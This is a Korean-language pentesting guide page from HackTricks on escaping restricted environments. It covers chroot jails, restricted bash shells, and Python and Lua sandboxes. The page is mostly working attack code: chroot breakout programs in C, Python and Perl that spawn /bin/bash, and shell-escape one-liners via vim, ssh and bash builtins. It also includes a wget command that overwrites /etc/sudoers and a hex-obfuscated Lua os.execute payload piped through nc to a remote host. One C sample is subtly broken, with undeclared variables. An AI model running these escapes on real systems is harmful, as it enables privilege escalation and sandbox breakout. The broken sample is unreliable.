# 감옥에서 탈출하기

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}

## **GTFOBins**

**"Shell" 속성이 있는 이진 파일을 실행할 수 있는지** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **에서 검색하세요.**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에서: chroot 메커니즘은 **특권이 있는** (**root**) **사용자에 의한 의도적인 변조를 방어하기 위한 것이 아닙니다**. 대부분의 시스템에서 chroot 컨텍스트는 제대로 쌓이지 않으며, **충분한 권한을 가진 chrooted 프로그램은 탈출하기 위해 두 번째 chroot를 수행할 수 있습니다**.\
보통 이는 탈출하기 위해 chroot 내부에서 root가 되어야 함을 의미합니다.

{% hint style="success" %}
**도구** [**chw00t**](https://github.com/earthquake/chw00t)는 다음 시나리오를 악용하고 `chroot`에서 탈출하기 위해 만들어졌습니다.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
chroot 내부에서 **root**인 경우 **다른 chroot를 생성하여 탈출할 수 있습니다**. 이는 2개의 chroot가 (리눅스에서) 공존할 수 없기 때문에, 폴더를 생성한 후 **그 새로운 폴더에서 새로운 chroot를 생성하면** **당신이 그 외부에 있을 때**, 이제는 **새로운 chroot 외부에 있게 되어** FS에 있게 됩니다.

이는 보통 chroot가 작업 디렉토리를 지정된 위치로 이동하지 않기 때문에 발생하므로, chroot를 생성할 수 있지만 그 외부에 있을 수 있습니다.
{% endhint %}

보통 chroot 감옥 안에서는 `chroot` 이진 파일을 찾을 수 없지만, **이진 파일을 컴파일, 업로드 및 실행할 수 있습니다**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>파이썬</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>  
펄
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
이것은 이전 사례와 유사하지만, 이 경우 **공격자가 현재 디렉토리에 대한 파일 설명자를 저장**하고 **새 폴더에 chroot를 생성**합니다. 마지막으로, 그는 chroot **외부**에서 그 **FD**에 **접근**할 수 있으므로 이를 접근하여 **탈출**합니다.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD는 Unix Domain Sockets를 통해 전달될 수 있으므로:

* 자식 프로세스 생성 (fork)
* 부모와 자식이 통신할 수 있도록 UDS 생성
* 자식 프로세스에서 다른 폴더에서 chroot 실행
* 부모 프로세스에서 새로운 자식 프로세스 chroot 외부의 폴더 FD 생성
* UDS를 사용하여 자식 프로세스에 그 FD 전달
* 자식 프로세스가 그 FD로 chdir하고, chroot 외부에 있기 때문에 감옥에서 탈출하게 됨
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* 루트 장치 (/)를 chroot 내부의 디렉토리에 마운트
* 그 디렉토리로 chroot

이것은 Linux에서 가능합니다
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* procfs를 chroot 내부의 디렉토리에 마운트 (아직 마운트되지 않았다면)
* 다른 root/cwd 항목이 있는 pid를 찾기, 예: /proc/1/root
* 그 항목으로 chroot
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Fork (자식 프로세스)를 생성하고 FS의 더 깊은 폴더로 chroot하고 그곳으로 CD
* 부모 프로세스에서 자식 프로세스가 있는 폴더를 자식의 chroot 이전 폴더로 이동
* 이 자식 프로세스는 chroot 외부에 있게 됨
{% endhint %}

### ptrace

{% hint style="warning" %}
* 예전에는 사용자가 자신의 프로세스에서 자신을 디버깅할 수 있었지만... 이제는 기본적으로 불가능
* 어쨌든 가능하다면, 프로세스에 ptrace를 사용하고 그 안에서 shellcode를 실행할 수 있음 ([이 예제 참조](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

감옥에 대한 정보 얻기:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH 수정

PATH 환경 변수를 수정할 수 있는지 확인하십시오.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim 사용하기
```bash
:set shell=/bin/sh
:shell
```
### 스크립트 생성

_check if you can create an executable file with _/bin/bash_ as content_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH를 통한 bash 얻기

ssh를 통해 접근하는 경우, bash 셸을 실행하기 위해 이 트릭을 사용할 수 있습니다:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 선언
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

예를 들어 sudoers 파일을 덮어쓸 수 있습니다.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 기타 트릭

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**다음 페이지도 흥미로울 수 있습니다:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python 감옥

다음 페이지에서 파이썬 감옥에서 탈출하는 트릭:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua 감옥

이 페이지에서는 lua 내부에서 접근할 수 있는 전역 함수를 찾을 수 있습니다: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**명령 실행과 함께 Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
라이브러리의 **함수를 점 없이 호출하는 몇 가지 요령**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
라이브러리의 함수 나열:
```bash
for k,v in pairs(string) do print(k,v) end
```
다음의 한 줄 코드를 **다른 lua 환경에서 실행할 때마다 함수의 순서가 변경됩니다**. 따라서 특정 함수를 실행해야 하는 경우, 다양한 lua 환경을 로드하고 le 라이브러리의 첫 번째 함수를 호출하여 무차별 공격을 수행할 수 있습니다:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**인터랙티브 lua 셸 얻기**: 제한된 lua 셸 안에 있다면 다음을 호출하여 새로운 lua 셸(그리고 희망적으로 무제한)을 얻을 수 있습니다:
```bash
debug.debug()
```
## References

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (슬라이드: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
